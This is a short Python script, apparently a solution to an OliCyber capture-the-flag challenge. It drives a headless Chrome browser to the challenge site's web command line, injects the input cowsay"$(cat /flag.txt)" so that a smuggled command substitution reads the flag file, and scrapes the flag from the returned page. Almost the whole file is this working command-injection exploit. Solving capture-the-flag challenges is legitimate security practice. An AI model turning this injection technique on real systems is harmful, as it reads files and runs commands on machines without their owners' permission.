import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from pyvirtualdisplay import Display
import time

url = 'http://timp.challs.olicyber.it/'
display = Display(visible=0, size=(800, 600))
display.start()
driver = webdriver.Chrome()
driver.get(url)
cmd = driver.find_element(By.XPATH, '//*[@id="cmdline"]')
time.sleep(7)
cmd.send_keys('cowsay"$(cat /flag.txt)"')
cmd.send_keys(Keys.ENTER)
time.sleep(8)
out = driver.page_source
out = out[out.find('flag{') : out.find('}') + 1]
out = out.replace('&nbsp;\<br>\&nbsp;', '')
print(out)